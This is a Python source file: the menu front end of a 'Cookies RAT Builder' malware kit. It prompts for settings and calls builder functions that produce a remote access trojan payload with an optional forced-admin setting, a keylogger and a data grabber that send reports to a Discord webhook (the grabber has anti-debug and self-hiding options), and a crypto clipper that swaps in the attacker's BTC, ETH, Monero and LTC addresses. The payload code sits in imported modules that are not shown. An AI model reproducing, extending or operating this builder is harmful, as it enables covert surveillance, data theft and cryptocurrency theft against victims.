from colorama import Fore, init
from util.plugins.common import *
from util.create_payload import CookiesRAT
from util.create_key_logger import Create_KeyLogger
from util.create_data_grabber import Create_Data
from cookies_package import *
from time import sleep
init(convert=True)




'''
MAIN MENU
'''
def main():
    clear()
    settitle(f"Cookies RAT Builder")
    
    print(banner)
    choice = str(input(
            f'{Fore.CYAN}Choice {Fore.YELLOW}>> {Fore.RESET}'))
 
    if choice == '1':       # Create PayLoad
        clear()
        filename = str(input(
            f'{Fore.CYAN}Enter output filename {Fore.YELLOW}>> {Fore.RESET}'))
        force_admin = str(input(
            f'{Fore.CYAN}Do u want the payload to create with force admin {Fore.YELLOW}>> {Fore.RESET}'))
        CookiesRAT(filename, force_admin)
        main()

    elif choice == '2':     # Create Custom PayLoad
        clear()
        print(f"{Fore.LIGHTRED_EX}Still in development. . .{Fore.RESET}")
        sleep(1)
        main()
        # custom_payload()

    elif choice == '3':     # Create Keylogger Add on
        clear()
        WebHook = str(input(
            f'{Fore.CYAN}Enter discord webhook {Fore.YELLOW}>> {Fore.RESET}'))
        send_report_every_sec = str(input(
            f'{Fore.CYAN}Send reports every how many second {Fore.RESET}({Fore.CYAN}default 60{Fore.RESET}) {Fore.YELLOW}>> {Fore.RESET}'))
        Create_KeyLogger(WebHook, send_report_every_sec)
        main()

    elif choice == '4':     # Create Data Grabber Add on
        clear()
        WebHook = str(input(
            f'{Fore.CYAN}Enter discord webhook {Fore.YELLOW}>> {Fore.RESET}'))
        Debug = bool(input(
            f'{Fore.CYAN}Do u want to enable anti debug? {Fore.RESET}({Fore.CYAN}leave empty for no{Fore.RESET})  {Fore.YELLOW}>> {Fore.RESET}'))
        Hide = bool(input(
             f'{Fore.CYAN}Do u want to hide data grabber after running? {Fore.RESET}({Fore.CYAN}leave empty for no{Fore.RESET}) {Fore.YELLOW}>> {Fore.RESET}'))
        Create_Data(WebHook, Debug, Hide)
        main()

    elif choice == '5':     # Create Crypto Clipper Add on
        clear()
        btc_address = str(input(
        f"{Fore.LIGHTWHITE_EX}Enter your BTC address {Fore.YELLOW}>>{Fore.RESET} "))
        eth_address = str(input(
        f"{Fore.LIGHTWHITE_EX}Enter your ETH address {Fore.YELLOW}>>{Fore.RESET} "))
        monero_address = str(input(
        f"{Fore.LIGHTWHITE_EX}Enter your MONERO address {Fore.YELLOW}>>{Fore.RESET} "))
        ltc_address = str(input(
        f"{Fore.LIGHTWHITE_EX}Enter your LTC address {Fore.YELLOW}>>{Fore.RESET} "))
        Create_Crypto_Clipper(btc_address, eth_address, monero_address, ltc_address)
        main()

    elif choice == '420':   # Exit RAT Builder
        settitle("Exiting...")
        clear()
        exit()
        
    else:                   # Invalid Choice
        clear()
        print(f"{Fore.LIGHTRED_EX}Please enter a valid choice{Fore.RESET}")
        sleep(1)
        main()



if __name__ == "__main__":
    main()